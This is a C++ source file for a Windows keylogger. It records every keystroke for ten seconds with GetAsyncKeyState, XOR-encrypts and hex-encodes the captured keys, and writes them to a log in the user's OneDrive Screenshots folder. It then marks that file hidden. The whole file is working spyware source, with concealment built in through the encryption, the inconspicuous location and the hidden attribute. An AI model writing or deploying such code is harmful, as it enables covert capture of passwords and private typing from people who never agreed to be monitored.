#include <iostream>
#include <fstream>
#include <windows.h>
#include <ctime>
#include <lmcons.h>  // For UNLEN
#include <direct.h>  // For _mkdir
#include <cstdio>    // For remove()
#include <sstream>   // For stringstream

using namespace std;

// Function to XOR encrypt/decrypt the data
string xorEncryptDecrypt(const string &data, const string &key) {
    string result = data;
    for (size_t i = 0; i < data.size(); ++i) {
        result[i] ^= key[i % key.size()];
    }
    return result;
}

// Function to convert a string to its hexadecimal representation
string stringToHex(const string &input) {
    stringstream hexStream;
    for (size_t i = 0; i < input.length(); ++i) {
        hexStream << hex << (int)(unsigned char)input[i];  // Convert each char to hex
    }
    return hexStream.str();
}

// Function to convert a hexadecimal string to normal text
string hexToString(const string &hex) {
    string result = "";
    for (size_t i = 0; i < hex.length(); i += 2) {
        string byte = hex.substr(i, 2);
        char chr = (char)strtol(byte.c_str(), NULL, 16);
        result.push_back(chr);
    }
    return result;
}

int main() {
    ofstream logfile;
    int key;
    time_t start_time, current_time;

    // Get the username
    char username[UNLEN + 1]; 
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);

    // Construct the full path for the log file in the OneDrive Pictures directory
    string logFilePath = "C:\\Users\\" + string(username) + "\\OneDrive\\Pictures\\Screenshots\\log.txt";

    // Check if the file exists, and if so, delete it
    if (remove(logFilePath.c_str()) == 0) {
        cout << "Previous log file deleted successfully.\n";
    }

    // Open the log file in truncation mode to create a new empty file
    logfile.open(logFilePath.c_str(), ios::trunc);

    time(&start_time);
    string loggedData; // Buffer to hold logged key data

    while (true) {
        time(&current_time);

        if (difftime(current_time, start_time) >= 10) {
            break;
        }

        for (key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 1) {
                loggedData += static_cast<char>(key); 
            }
        }
    }

    // Encrypt the logged data using XOR
    string encryptedData = xorEncryptDecrypt(loggedData, "12345");

    // Convert encrypted data to hexadecimal format for easier handling in decryption tools
    string hexData = stringToHex(encryptedData);

    // Write the hexadecimal data to the log file
    logfile << hexData;
    logfile.close();

    // Hide the log file
    SetFileAttributes(logFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN);

    return 0;
    // https://www.dcode.fr/xor-cipher    
}

